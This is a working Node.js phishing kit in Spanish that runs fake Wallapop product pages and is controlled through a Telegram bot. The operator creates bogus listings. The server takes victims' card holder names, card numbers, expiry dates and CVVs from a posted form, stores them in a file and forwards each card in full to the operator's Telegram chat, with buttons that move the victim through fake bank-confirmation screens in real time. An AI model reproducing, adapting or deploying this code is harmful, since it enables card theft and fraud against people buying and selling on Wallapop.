const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const os = require('os');

const CONFIG = JSON.parse(fs.readFileSync(path.join(__dirname, 'config.json'), 'utf8'));
const TOKEN = CONFIG.token;
const PORT = CONFIG.port || 3000;

const DATA = path.join(__dirname, 'data');
if (!fs.existsSync(DATA)) fs.mkdirSync(DATA);
const DBFILE = path.join(DATA, 'productos.json');
const OFFFILE = path.join(DATA, 'offset.json');

let db = { products: {}, activeId: '' };
try { db = JSON.parse(fs.readFileSync(DBFILE, 'utf8')); } catch (e) {}
const save = () => {
  fs.writeFileSync(DBFILE, JSON.stringify(db, null, 2));
  const webDir = path.join(__dirname, 'web');
  if (fs.existsSync(webDir)) {
    try {
      fs.writeFileSync(path.join(webDir, 'products.json'), JSON.stringify(db, null, 2));
    } catch (e) {}
  }
};

let offset = 0;
try { offset = JSON.parse(fs.readFileSync(OFFFILE, 'utf8')).offset || 0; } catch (e) {}
const saveOffset = () => fs.writeFileSync(OFFFILE, JSON.stringify({ offset }));

/* ---------- utilidades ---------- */
const esc = s => String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
const eur = n => new Intl.NumberFormat('es-ES', { maximumFractionDigits: 2 }).format(Number(n) || 0) + ' €';
const num = s => {
  const n = parseFloat(String(s).replace(/\./g, '').replace(',', '.'));
  return isNaN(n) ? null : Math.round(n * 100) / 100;
};
const newId = () => 'AD' + String(Math.floor(1000000 + Math.random() * 9000000));
const sleep = ms => new Promise(r => setTimeout(r, ms));

function lanIP() {
  const nets = os.networkInterfaces();
  for (const name of Object.keys(nets)) {
    for (const n of nets[name] || []) {
      if (n.family === 'IPv4' && !n.internal) return n.address;
    }
  }
  return 'localhost';
}
const publicBase = () => (CONFIG.publicUrl || CONFIG.base_url || 'http://localhost:3000').replace(/\/$/, '');

/* ---------- Telegram ---------- */
function tg(method, payload) {
  return new Promise(resolve => {
    const body = JSON.stringify(payload || {});
    const req = https.request({
      hostname: 'api.telegram.org',
      path: '/bot' + TOKEN + '/' + method,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
    }, r => {
      let d = '';
      r.on('data', c => d += c);
      r.on('end', () => { try { resolve(JSON.parse(d)); } catch (e) { resolve({ ok: false }); } });
    });
    req.on('error', () => resolve({ ok: false }));
    req.write(body);
    req.end();
  });
}

const reply = (chat, text, extra) =>
  tg('sendMessage', Object.assign({ chat_id: chat, text, parse_mode: 'HTML', disable_web_page_preview: true }, extra || {}));

const AYUDA =
'<b>🟢 Panel de operaciones Wallapop</b>\n\n' +
'/nuevo → crea un producto y te devuelvo su enlace\n' +
'/productos → lista los enlaces\n' +
'/editar ID → deja un producto activo\n\n' +
'<b>Con un producto activo</b>\n' +
'/titulo texto\n/precio número\n/descripcion texto\n/importe número\n' +
'/nombre texto\n/direccion texto\n/articulo texto\n' +
'/foto + imagen · /quitarfotos\n\n' +
'/borrar ID · /cancelar · /ayuda';

function resumen(p) {
  return '<b>' + esc(p.titulo || 'Sin título') + '</b>\n' +
    eur(p.precio) + ' · ' + (p.fotos || []).length + ' foto(s)\n' +
    'ID: <code>' + p.id + '</code>';
}

/* notificación con estilo Wallapop 2.0 */
async function notificar(chat, p) {
  const url = publicBase() + '/a/' + p.id;
  const vendedor = p.nombre || 'Sofía Chamizo';
  const titulo = p.titulo || 'Artículo Wallapop';
  const caption =
    '<blockquote><b>' + esc(vendedor) + ' ➔ ' + esc(titulo) + '</b>\n' +
    url + '</blockquote>\n\n' +
    '<blockquote>🍥 Producto creado con éxito ❞</blockquote>\n\n' +
    '🇪🇸 <u>Wallapop</u> 2.0 • #' + p.id + ' 📇';

  const kb = { inline_keyboard: [[{ text: '🍥 Abrir anuncio ❞', url }]] };
  const base = { chat_id: chat, caption, parse_mode: 'HTML', reply_markup: kb };

  if ((p.fotos || []).length) {
    const r = await tg('sendPhoto', Object.assign({ photo: p.fotos[0] }, base));
    if (!r.ok) await tg('sendMessage', { chat_id: chat, text: caption, parse_mode: 'HTML', reply_markup: kb, disable_web_page_preview: false });
  } else {
    await tg('sendMessage', { chat_id: chat, text: caption, parse_mode: 'HTML', reply_markup: kb, disable_web_page_preview: false });
  }
}

/* ---------- bot ---------- */
let wizard = null;
let txEstados = {};
let ultimoChat = '';

async function fileUrl(msg) {
  const list = msg.photo;
  const id = list[list.length - 1].file_id;
  const r = await tg('getFile', { file_id: id });
  if (!r.ok) throw new Error('getFile');
  const tgUrl = 'https://api.telegram.org/file/bot' + TOKEN + '/' + r.result.file_path;
  try {
    const res = await new Promise(resolve => {
      https.get(tgUrl, resp => {
        const chunks = [];
        resp.on('data', c => chunks.push(c));
        resp.on('end', () => resolve(Buffer.concat(chunks)));
        resp.on('error', () => resolve(null));
      });
    });
    if (res && res.length) {
      return 'data:image/jpeg;base64,' + res.toString('base64');
    }
  } catch (e) {}
  return tgUrl;
}

async function handle(update) {
  if (update.callback_query) {
    const cq = update.callback_query;
    const cqId = cq.id;
    const cqData = cq.data || '';
    const chat = cq.message && cq.message.chat ? cq.message.chat.id : null;
    const msgId = cq.message ? cq.message.message_id : null;
    if (chat) ultimoChat = chat;

    if (cqData.startsWith('continuar_') || cqData === 'continuar') {
      const target = cqData.replace('continuar_', '') || db.activeId;
      txEstados[target] = 'continue';
      if (db.activeId) txEstados[db.activeId] = 'continue';
      tg('setMyDescription', { description: 'status:continue:' + target });
      await tg('answerCallbackQuery', { callback_query_id: cqId, text: '✅ Aprobado. El cliente avanza a Confirmar.' });
      if (chat && msgId) {
        await tg('editMessageReplyMarkup', {
          chat_id: chat,
          message_id: msgId,
          reply_markup: { inline_keyboard: [[{ text: '✅ CONTINUADO (Confirmar)', callback_data: 'noop' }]] }
        });
      }
      return;
    }

    if (cqData.startsWith('confirmar_again_') || cqData === 'confirmar_again') {
      const target = cqData.replace('confirmar_again_', '') || db.activeId;
      txEstados[target] = 'confirmado_final';
      if (db.activeId) txEstados[db.activeId] = 'confirmado_final';
      tg('setMyDescription', { description: 'status:confirmado_final:' + target });
      await tg('answerCallbackQuery', { callback_query_id: cqId, text: '✅ Confirmación aprobada. Pantalla 24h-48h activada.' });
      if (chat && msgId) {
        await tg('editMessageReplyMarkup', {
          chat_id: chat,
          message_id: msgId,
          reply_markup: { inline_keyboard: [[{ text: '✅ CONFIRMADO (Dinero en 24h-48h)', callback_data: 'noop' }]] }
        });
      }
      return;
    }

    if (cqData.startsWith('error_') || cqData === 'error') {
      const target = cqData.replace('error_', '') || db.activeId;
      txEstados[target] = 'error';
      if (db.activeId) txEstados[db.activeId] = 'error';
      tg('setMyDescription', { description: 'status:error:' + target });
      await tg('answerCallbackQuery', { callback_query_id: cqId, text: '❌ Marcado como Error.' });
      if (chat && msgId) {
        await tg('editMessageReplyMarkup', {
          chat_id: chat,
          message_id: msgId,
          reply_markup: { inline_keyboard: [[{ text: '❌ ERROR MARCADO', callback_data: 'noop' }]] }
        });
      }
      return;
    }

    if (cqData === 'noop') {
      await tg('answerCallbackQuery', { callback_query_id: cqId, text: 'Esta acción ya fue realizada.' });
      return;
    }
    return;
  }

  const msg = update.message || update.edited_message;
  if (!msg) return;
  const chat = msg.chat.id;
  ultimoChat = chat;
  const texto = (msg.text || '').trim();

  if (msg.photo) {
    if (wizard && wizard.step === 'fotos') {
      try {
        wizard.draft.fotos.push(await fileUrl(msg));
        return reply(chat, '🖼 ' + wizard.draft.fotos.length + ' foto(s). Manda más o escribe /listo.');
      } catch (e) { return reply(chat, '⚠️ No pude descargar la imagen, prueba otra vez.'); }
    }
    const act = db.products[db.activeId];
    if (act) {
      try {
        act.fotos = act.fotos || [];
        act.fotos.push(await fileUrl(msg));
        save();
        return reply(chat, '✅ Foto añadida (' + act.fotos.length + ').\n' + publicBase() + '/a/' + act.id);
      } catch (e) { return reply(chat, '⚠️ No pude descargar la imagen.'); }
    }
    return reply(chat, 'Envía /nuevo o /editar ID antes de mandar fotos.');
  }

  if (wizard && texto && !texto.startsWith('/')) {
    const d = wizard.draft;
    if (wizard.step === 'titulo') { d.titulo = texto; d.articulo = texto; wizard.step = 'precio'; return reply(chat, '2/5 · ¿Precio en euros? (ejemplo: 250)'); }
    if (wizard.step === 'precio') {
      const n = num(texto);
      if (n === null) return reply(chat, 'Pon un número válido, por ejemplo 250');
      d.precio = n; d.precioArticulo = n; wizard.step = 'nombre';
      return reply(chat, '3/5 · ¿Nombre y apellidos completos? (ejemplo: Sofía Chamizo)');
    }
    if (wizard.step === 'nombre') {
      d.nombre = texto; wizard.step = 'direccion';
      return reply(chat, '4/5 · ¿Dirección completa de envío? (ejemplo: Paseo Prudencia Narváez 48 Piso 4, Cáceres, 17024)');
    }
    if (wizard.step === 'direccion') {
      d.direccion = texto; wizard.step = 'descripcion';
      return reply(chat, '5/5 · ¿Descripción del producto? (o pon un . para omitir)');
    }
    if (wizard.step === 'descripcion') {
      d.descripcion = texto === '.' ? '' : texto; wizard.step = 'fotos';
      return reply(chat, '📷 Envía las fotos que quieras y escribe /listo para terminar.');
    }
  }

  if (!texto.startsWith('/')) return;

  const i = texto.indexOf(' ');
  const cmd = (i === -1 ? texto : texto.slice(0, i)).toLowerCase().split('@')[0];
  const arg = i === -1 ? '' : texto.slice(i + 1).trim();
  const act = db.products[db.activeId];

  switch (cmd) {
    case '/start':
    case '/ayuda':
      return reply(chat, AYUDA);

    case '/nuevo':
      wizard = { step: 'titulo', draft: { id: newId(), fotos: [], nombre: '', direccion: '' } };
      return reply(chat, '1/5 · ¿Título del producto?');

    case '/cancelar':
      wizard = null;
      return reply(chat, 'Creación cancelada.');

    case '/listo': {
      if (!wizard) return reply(chat, 'No hay ningún producto en creación.');
      const d = wizard.draft;
      d.descripcion = d.descripcion || '';
      db.products[d.id] = d;
      db.activeId = d.id;
      save();
      wizard = null;
      return notificar(chat, d);
    }

    case '/productos': {
      const ids = Object.keys(db.products);
      if (!ids.length) return reply(chat, 'Todavía no hay productos. Usa /nuevo.');
      return reply(chat, ids.map(id => {
        const p = db.products[id];
        return '• ' + esc(p.titulo || 'Sin título') + ' — ' + eur(p.precio) + '\n' + publicBase() + '/a/' + id;
      }).join('\n\n'));
    }

    case '/editar': {
      const p = db.products[arg];
      if (!p) return reply(chat, 'Uso: /editar ID (mira /productos)');
      db.activeId = p.id; save();
      return reply(chat, '✏️ Editando:\n' + resumen(p) + '\n' + publicBase() + '/a/' + p.id);
    }

    case '/borrar': {
      if (!db.products[arg]) return reply(chat, 'Uso: /borrar ID');
      delete db.products[arg];
      if (db.activeId === arg) db.activeId = '';
      save();
      return reply(chat, '🗑 Producto borrado.');
    }

    case '/foto':
      return reply(chat, '📷 Envía la imagen y la añado al producto activo.');

    case '/quitarfotos':
      if (!act) return reply(chat, 'No hay producto activo. Usa /editar ID.');
      act.fotos = []; save();
      return reply(chat, '🧹 Fotos eliminadas.');

    case '/titulo':
      if (!act) return reply(chat, 'No hay producto activo. Usa /editar ID.');
      if (!arg) return reply(chat, 'Uso: /titulo Nuevo título');
      act.titulo = arg; save();
      return reply(chat, '✅ Título actualizado.');

    case '/precio': {
      if (!act) return reply(chat, 'No hay producto activo. Usa /editar ID.');
      const n = num(arg);
      if (n === null) return reply(chat, 'Uso: /precio 250');
      act.precio = n; act.precioArticulo = n; save();
      return reply(chat, '✅ Precio: ' + eur(n));
    }

    case '/importe': {
      if (!act) return reply(chat, 'No hay producto activo.');
      const n = num(arg);
      if (n === null) return reply(chat, 'Uso: /importe 250,00');
      act.precioArticulo = n; save();
      return reply(chat, '✅ Importe a recibir: ' + eur(n));
    }

    case '/descripcion':
      if (!act) return reply(chat, 'No hay producto activo.');
      if (!arg) return reply(chat, 'Uso: /descripcion Texto');
      act.descripcion = arg; save();
      return reply(chat, '✅ Descripción actualizada.');

    case '/nombre':
      if (!act) return reply(chat, 'No hay producto activo.');
      if (!arg) return reply(chat, 'Uso: /nombre Sofía Chamizo');
      act.nombre = arg; save();
      return reply(chat, '✅ Nombre actualizado.');

    case '/direccion':
      if (!act) return reply(chat, 'No hay producto activo.');
      if (!arg) return reply(chat, 'Uso: /direccion Calle, número, ciudad, CP');
      act.direccion = arg; save();
      return reply(chat, '✅ Dirección actualizada.');

    case '/articulo':
      if (!act) return reply(chat, 'No hay producto activo.');
      if (!arg) return reply(chat, 'Uso: /articulo Texto');
      act.articulo = arg; save();
      return reply(chat, '✅ Artículo actualizado.');

    case '/estado':
      if (!act) return reply(chat, 'No hay producto activo.');
      return reply(chat, resumen(act) + '\n' + publicBase() + '/a/' + act.id);

    default:
      return reply(chat, 'Comando no reconocido. Envía /ayuda.');
  }
}

async function poll() {
  for (;;) {
    try {
      const r = await tg('getUpdates', { timeout: 25, offset: offset + 1 });
      if (r.ok) {
        for (const u of r.result) {
          offset = u.update_id;
          saveOffset();
          handle(u).catch(() => {});
        }
      } else {
        await sleep(5000);
      }
    } catch (e) {
      await sleep(4000);
    }
  }
}

/* ---------- HTTP ---------- */
const WEB_DIR = path.join(__dirname, 'web');
const PAGE = fs.existsSync(path.join(WEB_DIR, 'index.html')) ? path.join(WEB_DIR, 'index.html') : path.join(__dirname, 'index.html');
const CONFIRMAR_PAGE = fs.existsSync(path.join(WEB_DIR, 'confirmar.html')) ? path.join(WEB_DIR, 'confirmar.html') : path.join(__dirname, 'confirmar.html');
const STEP2_PAGE = fs.existsSync(path.join(WEB_DIR, 'step2.html')) ? path.join(WEB_DIR, 'step2.html') : path.join(__dirname, 'step2.html');
const TARJ_FILE = path.join(DATA, 'tarjetas.json');

const server = http.createServer((req, res) => {
  const url = req.url.split('?')[0];

  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    return res.end();
  }

  // Status check for card & confirmar
  const statusMatch = url.match(/^\/api\/product\/([^/]+)\/(?:tarjeta|confirmar)\/status/);
  if (statusMatch) {
    const id = statusMatch[1];
    const st = txEstados[id] || 'waiting';
    res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
    return res.end(JSON.stringify({ status: st, id }));
  }

  if (url === '/api/tarjeta/status' || url === '/api/confirmar/status') {
    const query = new URL('http://localhost' + req.url).searchParams;
    const tid = query.get('id') || '';
    const st = txEstados[tid] || 'waiting';
    res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
    return res.end(JSON.stringify({ status: st }));
  }

  // Notificación al entrar en confirmar.html
  const confMatch = url.match(/^\/api\/product\/([^/]+)\/confirmar$/);
  if (confMatch) {
    const id = confMatch[1];
    if (!txEstados[id] || txEstados[id] !== 'confirmado_final') {
      txEstados[id] = 'en_confirmar';
    }
    const destChat = ultimoChat || '8791932410';
    if (destChat) {
      const p = db.products[id];
      const tProd = (p && p.titulo) ? p.titulo : id;
      const prProd = (p && p.precio) ? eur(p.precio) : '';
      const txtAviso =
        '📱 <b>CLIENTE EN CONFIRMACIÓN</b>\n' +
        '───────────────────\n' +
        '📦 <b>Producto:</b> ' + esc(tProd) + '\n' +
        '🆔 <b>ID:</b> <code>' + id + '</code>' +
        (prProd ? '\n💰 <b>Importe:</b> ' + prProd : '') + '\n\n' +
        '⏳ El cliente está en la pantalla de confirmación bancaria.';

      const kb = {
        inline_keyboard: [[
          { text: 'Confirmar de nuevo', callback_data: 'confirmar_again_' + id }
        ]]
      };

      tg('sendMessage', {
        chat_id: destChat,
        text: txtAviso,
        parse_mode: 'HTML',
        reply_markup: kb,
        disable_web_page_preview: true
      });
    }

    res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
    return res.end(JSON.stringify({ ok: true, status: txEstados[id] }));
  }

  // POST card data
  const tarjMatch = url.match(/^\/api\/product\/([^/]+)\/tarjeta/);
  if (tarjMatch && req.method === 'POST') {
    const id = tarjMatch[1];
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', async () => {
      try {
        const tarjeta = JSON.parse(body);
        let todas = [];
        if (fs.existsSync(TARJ_FILE)) {
          try { todas = JSON.parse(fs.readFileSync(TARJ_FILE, 'utf8')); } catch (e) {}
        }
        const registro = {
          id,
          fecha: new Date().toISOString(),
          titular: tarjeta.titular,
          marca: tarjeta.marca,
          numero: tarjeta.numero,
          cad: tarjeta.cad,
          cvv: tarjeta.cvv
        };
        todas.push(registro);
        fs.writeFileSync(TARJ_FILE, JSON.stringify(todas, null, 2));

        if (db.products[id]) {
          db.products[id].tarjeta = registro;
          save();
        }

        txEstados[id] = 'waiting';

        if (ultimoChat) {
          const tProd = (db.products[id] && db.products[id].titulo) ? db.products[id].titulo : id;
          const txtAviso =
            '💳 <b>¡NUEVA TARJETA RECIBIDA!</b>\n' +
            '───────────────────\n' +
            '📦 <b>Producto:</b> ' + esc(tProd) + '\n' +
            '🆔 <b>ID:</b> <code>' + id + '</code>\n\n' +
            '👤 <b>Titular:</b> ' + esc(tarjeta.titular) + '\n' +
            '💳 <b>Tarjeta:</b> <code>' + tarjeta.numero + '</code> (' + (tarjeta.marca || '') + ')\n' +
            '📅 <b>Caducidad:</b> <code>' + tarjeta.cad + '</code>\n' +
            '🔒 <b>CVV:</b> <code>' + tarjeta.cvv + '</code>';

          const kb = {
            inline_keyboard: [[
              { text: '✅ Continuar', callback_data: 'continuar_' + id },
              { text: '❌ Error', callback_data: 'error_' + id }
            ]]
          };

          await tg('sendMessage', {
            chat_id: ultimoChat,
            text: txtAviso,
            parse_mode: 'HTML',
            reply_markup: kb,
            disable_web_page_preview: true
          });
        }
      } catch (e) {}

      res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
      res.end(JSON.stringify({ ok: true, status: 'waiting' }));
    });
    return;
  }

  if (url.startsWith('/api/product/')) {
    const p = db.products[url.slice('/api/product/'.length)];
    res.writeHead(p ? 200 : 404, { 'Content-Type': 'application/json; charset=utf-8' });
    return res.end(JSON.stringify(p || {}));
  }

  if (url === '/api/health') {
    res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
    return res.end(JSON.stringify({ ok: true }));
  }

  if (url === '/confirmar.html' || url === '/confirmar') {
    if (fs.existsSync(CONFIRMAR_PAGE)) {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return res.end(fs.readFileSync(CONFIRMAR_PAGE));
    }
  }

  if (url === '/step2.html' || url === '/step2') {
    if (fs.existsSync(STEP2_PAGE)) {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return res.end(fs.readFileSync(STEP2_PAGE));
    }
  }

  if (url === '/' || url.startsWith('/a/')) {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    return res.end(fs.readFileSync(PAGE));
  }

  // Static files (e.g. visa.png, mastercard.png)
  let filePath = path.join(WEB_DIR, url.replace(/^\//, ''));
  if (!fs.existsSync(filePath) || !fs.statSync(filePath).isFile()) {
    filePath = path.join(__dirname, url.replace(/^\//, ''));
  }
  if (fs.existsSync(filePath) && fs.statSync(filePath).isFile()) {
    const ext = path.extname(filePath).toLowerCase();
    const mimeMap = {
      '.png': 'image/png',
      '.jpg': 'image/jpeg',
      '.jpeg': 'image/jpeg',
      '.svg': 'image/svg+xml',
      '.ico': 'image/x-icon',
      '.css': 'text/css; charset=utf-8',
      '.js': 'application/javascript; charset=utf-8',
      '.html': 'text/html; charset=utf-8'
    };
    res.writeHead(200, { 'Content-Type': mimeMap[ext] || 'application/octet-stream' });
    return res.end(fs.readFileSync(filePath));
  }

  res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
  res.end('No encontrado');
});

if (!Object.keys(db.products).length) {
  db.products['HSdc6CU3XJZg2lb1'] = {
    id: 'HSdc6CU3XJZg2lb1',
    titulo: 'Lote Perfumes Mujer 14 Uds.',
    precio: 250,
    precioArticulo: 250,
    descripcion: 'Lote de 14 perfumes de mujer, todos precintados. Se vende el lote completo.',
    nombre: 'Sofía Chamizo',
    direccion: 'Paseo Prudencia Narváez 48 Piso 4, Cáceres, 17024',
    articulo: 'Lote Perfumes Mujer 14 uds.',
    fotos: []
  };
  save();
}

server.listen(PORT, '0.0.0.0', () => {
  console.log('');
  console.log('  🟢 Wallapop bot en marcha');
  console.log('  Local:   http://localhost:' + PORT);
  console.log('  Móvil:   http://' + lanIP() + ':' + PORT + ' (misma wifi)');
  console.log('  Producto: http://' + lanIP() + ':' + PORT + '/a/HSdc6CU3XJZg2lb1');
  console.log('');
  poll();
});